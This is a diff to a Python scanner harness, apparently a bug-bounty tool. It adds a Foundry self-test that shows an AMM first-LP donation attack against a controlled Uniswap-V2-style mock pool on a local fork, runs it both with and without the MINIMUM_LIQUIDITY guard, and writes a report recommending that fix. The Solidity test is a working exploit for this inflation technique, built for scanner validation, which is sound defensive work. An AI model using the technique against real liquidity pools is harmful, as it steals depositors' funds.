@@ -182,6 +182,93 @@ def build_erc4626_selftest_sol(vulnerable: bool) -> str:
     return _ERC4626_SELFTEST.replace("__GUARDED__", "false" if vulnerable else "true")
 
 
+# =====================================================================================================
+# AMM donation / first-LP self-test (Uniswap-V2 shape). First LP mints a tiny position, DONATES tokens
+# straight to the pool to inflate reserves-per-LP, a victim adds liquidity (rounds to ~0 LP on the
+# vulnerable pool), the attacker removes liquidity and captures the victim's deposit.
+#   VULNERABLE: no MINIMUM_LIQUIDITY burn -> the 1-wei first mint succeeds, inflation works, attacker profits.
+#   SAFE: Uniswap-V2 MINIMUM_LIQUIDITY (1000 LP) burned to address(0) on the first mint -> the tiny first
+#         mint reverts, the attacker never gets LP, its donation is captured by the victim -> discarded.
+_AMM_SELFTEST = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {Test, console2} from "forge-std/Test.sol";
+
+contract MockERC20 {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    function mint(address to, uint256 a) external { balanceOf[to] += a; }
+    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
+    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
+    function transferFrom(address f, address to, uint256 a) external returns (bool) {
+        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
+        balanceOf[f] -= a; balanceOf[to] += a; return true;
+    }
+}
+
+contract Pair {
+    MockERC20 public token;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;   // LP balances
+    bool public immutable guarded;
+    uint256 constant MINIMUM_LIQUIDITY = 1000;
+    constructor(MockERC20 t, bool g) { token = t; guarded = g; }
+    function reserve() public view returns (uint256) { return token.balanceOf(address(this)); }
+    function addLiquidity(uint256 amount, address to) external returns (uint256 liq) {
+        uint256 ts = totalSupply;
+        liq = ts == 0 ? amount : amount * ts / reserve();   // reserve() = balance BEFORE this transferFrom
+        token.transferFrom(msg.sender, address(this), amount);
+        if (ts == 0 && guarded) {                           // UniV2: lock MINIMUM_LIQUIDITY to address(0)
+            require(liq > MINIMUM_LIQUIDITY, "min liq");
+            balanceOf[address(0)] += MINIMUM_LIQUIDITY; totalSupply += MINIMUM_LIQUIDITY; liq -= MINIMUM_LIQUIDITY;
+        }
+        balanceOf[to] += liq; totalSupply += liq;
+    }
+    function removeLiquidity(uint256 liq, address to) external returns (uint256 amt) {
+        amt = liq * reserve() / totalSupply;
+        balanceOf[msg.sender] -= liq; totalSupply -= liq;
+        token.transfer(to, amt);
+    }
+}
+
+contract PoC is Test {
+    uint256 constant EXPECTED_CHAINID = 1;
+    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
+    function test_amm_donation() public {
+        MockERC20 tok = new MockERC20();
+        Pair p = new Pair(tok, __GUARDED__);
+        address attacker = address(0xA11CE);
+        address victim = address(0xBEEF);
+        uint256 donation = 1000 ether;
+        uint256 victimDep = 500 ether;
+        tok.mint(attacker, donation + 1 ether);
+        tok.mint(victim, victimDep);
+        uint256 attBefore = tok.balanceOf(attacker);
+        vm.startPrank(attacker);
+        tok.approve(address(p), type(uint256).max);
+        try p.addLiquidity(1, attacker) {} catch {}         // tiny first LP (reverts on the safe pool)
+        tok.transfer(address(p), donation);                 // donation inflates reserves-per-LP
+        vm.stopPrank();
+        vm.startPrank(victim);
+        tok.approve(address(p), type(uint256).max);
+        try p.addLiquidity(victimDep, victim) {} catch {}
+        vm.stopPrank();
+        vm.startPrank(attacker);
+        uint256 lp = p.balanceOf(attacker);
+        if (lp > 0) { try p.removeLiquidity(lp, attacker) {} catch {} }
+        vm.stopPrank();
+        uint256 attAfter = tok.balanceOf(attacker);
+        console2.log("CHAIN_PROFIT_WEI", int256(attAfter) - int256(attBefore));
+        assertGt(attAfter, attBefore, "no profit: donation did not capture the victim LP");
+    }
+}
+"""
+
+
+def build_amm_selftest_sol(vulnerable: bool) -> str:
+    """AMM donation self-test: vulnerable (no MINIMUM_LIQUIDITY) or safe (UniV2 MINIMUM_LIQUIDITY burn)."""
+    return _AMM_SELFTEST.replace("__GUARDED__", "false" if vulnerable else "true")
+
+
 _PROFIT_RE = re.compile(r"CHAIN_PROFIT_WEI\s+(-?\d+)")
 _PX_RE = re.compile(r"ETH_USD_8DP\s+(\d+)")
 
@@ -356,6 +443,95 @@ decimals offset) so share price cannot be inflated and small deposits never roun
              f"| Vault.deposit/redeem | none (no MIN_LIQUIDITY) | CONFIRMED | "
              f"{'PASS, +' + str(vuln['profit_wei']) + ' wei captured' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
              f"| Vault.deposit/redeem | MINIMUM_LIQUIDITY dead-shares | DISCARDED | "
+             f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
+    try:
+        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
+    except OSError:
+        pass
+
+    return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
+            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
+
+
+def _run_pattern(forge, proj, rpc_url, subdir, name, test_re, sol, timeout=160):
+    d = proj / "test" / "gen" / subdir
+    d.mkdir(parents=True, exist_ok=True)
+    for old in d.glob("*.t.sol"):
+        try: old.unlink()
+        except OSError: pass
+    p = d / f"{name}.t.sol"
+    p.write_text(sol, encoding="utf-8")
+    r = subprocess.run([forge, "test", "--mp", str(p.relative_to(proj)), "--fork-url", rpc_url, "-vv"],
+                       cwd=proj, capture_output=True, text=True, timeout=timeout)
+    out = r.stdout + "\n" + r.stderr
+    passed = re.search(rf"\[PASS\]\s+{test_re}", out) is not None
+    pm = _PROFIT_RE.search(out)
+    return {"passed": passed, "profit_wei": int(pm.group(1)) if pm else 0, "test_path": str(p), "out": out}
+
+
+def run_amm_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
+    """AMM donation self-test, both directions. VULNERABLE (no MINIMUM_LIQUIDITY) must CONFIRM (attacker
+    captures the victim LP, profit>0); SAFE (UniV2 MINIMUM_LIQUIDITY burn) must DISCARD (attacker loses its
+    donation, profit<=0). Writes self_test_amm_<ts>.md + appends to the README. 'green' iff both hold."""
+    forge = forge_bin()
+    if not forge or not rpc_url:
+        return {"green": False, "error": "forge or rpc unavailable"}
+    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
+    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
+    if not _ensure_forge_std(proj, forge):
+        return {"green": False, "error": "forge-std unavailable"}
+
+    vuln = _run_pattern(forge, proj, rpc_url, "selftestamm", "VulnPair", "test_amm_donation", build_amm_selftest_sol(True))
+    safe = _run_pattern(forge, proj, rpc_url, "selftestamm", "SafePair", "test_amm_donation", build_amm_selftest_sol(False))
+    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
+    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
+    green = vuln_confirmed and safe_discarded
+
+    out_dir.mkdir(parents=True, exist_ok=True)
+    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
+    report_path = ""
+    if vuln_confirmed:
+        trace = "\n".join(l for l in vuln["out"].splitlines()
+                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
+        md = f"""> **Harness self-test — controlled target, not a historical reproduction.**
+
+# AMM first-LP donation captures a victim's liquidity
+
+**Chain:** ethereum (fork)  ·  **Contract:** (controlled UniV2-style Pair, deployed on the fork)  ·  **Verdict:** CONFIRMED
+
+## Description
+A pool with no MINIMUM_LIQUIDITY burn lets the first LP mint a 1-wei position, then DONATE tokens straight
+to the pair to inflate reserves-per-LP. A later liquidity provider rounds down to ~0 LP, and the attacker
+removes its position for the whole inflated pool — capturing the victim's deposit. Proven on a fork: the
+attacker netted **{vuln['profit_wei']} wei** (the victim's liquidity).
+
+## Vulnerability Details
+`addLiquidity()` computes `liq = amount * totalSupply / reserve` with no MINIMUM_LIQUIDITY burn, so a
+donation after a 1-wei first mint inflates the ratio and rounds the next LP to zero.
+
+## Impact Details
+- **Captured on the fork:** {vuln['profit_wei']} wei of the pool's token (the victim's added liquidity).
+
+## Proof of Concept
+Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`
+```
+{trace}
+```
+Negative control (same template, UniV2 MINIMUM_LIQUIDITY burn present): profit {safe['profit_wei']} wei → **discarded**.
+
+## Recommendation
+Burn MINIMUM_LIQUIDITY (e.g. 1000 LP to address(0)) on the first mint, Uniswap-V2 style, so share price can't
+be inflated and small deposits never round to zero.
+"""
+        report_path = str(out_dir / f"self_test_amm_{ts}.md")
+        Path(report_path).write_text(md, encoding="utf-8")
+
+    readme = out_dir / "SELFTEST_README.md"
+    extra = (f"\n\n## AMM donation ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
+             f"| Target | Guard | Expected | Result |\n|---|---|---|---|\n"
+             f"| Pair.addLiquidity/removeLiquidity | none (no MIN_LIQUIDITY) | CONFIRMED | "
+             f"{'PASS, +' + str(vuln['profit_wei']) + ' wei captured' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
+             f"| Pair.addLiquidity/removeLiquidity | UniV2 MINIMUM_LIQUIDITY burn | DISCARDED | "
              f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
     try:
         readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
